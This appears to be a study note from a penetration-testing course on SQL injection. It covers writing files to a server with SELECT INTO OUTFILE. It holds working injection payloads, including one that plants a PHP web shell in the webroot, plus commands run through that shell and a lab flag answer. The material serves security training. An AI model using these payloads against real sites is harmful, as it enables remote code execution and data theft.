## ID
536

## Module
SQL Injection Fundamentals

## Kind
notes

## Title
Section 15 — Writing Files

## Description
Write arbitrary files to the server through SQL injection using SELECT INTO OUTFILE, culminating in uploading a PHP web shell for remote code execution.

## Tags
sqli, file-write, webshell, into-outfile, rce, secure-file-priv

## Commands
- cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
- cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
- cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
- http://<TARGET>/shell.php?0=<COMMAND>

## What This Section Covers
If the DB user has FILE privilege and `secure_file_priv` is empty, you can write files to the server using `SELECT INTO OUTFILE`. The endgame is writing a PHP web shell to the webroot, giving you remote code execution as www-data. Three conditions required: FILE privilege, empty secure_file_priv, and write access to the target directory.

## Methodology
1. **Confirm FILE privilege** — Already done in Section 14 (super_priv = Y, FILE in privilege list).
2. **Check secure_file_priv** — `UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`. Empty = write anywhere. A path = restricted to that folder. NULL = no writes at all.
3. **Test write access** — Write a proof file: `cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`. Browse to `/proof.txt` to confirm.
4. **Write a web shell** — `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`. Use `""` instead of numbers for cleaner output.
5. **Execute commands** — Browse to `/shell.php?0=id` to confirm RCE, then `?0=cat /flag.txt` or `?0=find / -name flag* 2>/dev/null` to find the flag.

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Find the flag using a webshell | d2b5b27ae688b6a0f1d21b7d3a0798cd | Wrote PHP shell via INTO OUTFILE, then `?0=find / -name flag*` → found `/var/www/flag.txt` → `?0=cat /var/www/flag.txt` |

## Key Takeaways
- Three conditions for file writes: FILE privilege + empty secure_file_priv + OS write access to the directory.
- MariaDB defaults secure_file_priv to empty (writable). MySQL defaults to `/var/lib/mysql-files` (restricted). Some configs set NULL (no writes).
- Use `""` instead of junk numbers in the UNION to get clean file output without extra characters.
- `<?php system($_REQUEST[0]); ?>` is a one-liner web shell — parameter `0` takes any OS command.
- The web shell runs as www-data (Apache's user), not as root.
- Default webroots: Apache = `/var/www/html/`, Nginx = `/usr/share/nginx/html/`. Check configs with LOAD_FILE if unsure.

## Gotchas
- INTO OUTFILE will error if the file already exists — you can't overwrite, only create new files.
- If the page shows no error but the file doesn't appear, the MySQL OS user likely lacks write permissions to that directory.
- The webshell output includes all UNION columns in the file — use empty strings to avoid noise in the shell output.
- URL-encode special characters in the command parameter (spaces = `%20`, `&` = `%26`) or the command will break.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|sql-injection-fundamentals]]  
← [[13-database-enumeration]] | [[16-mitigation]] →
<!-- AUTO-LINKS-END -->
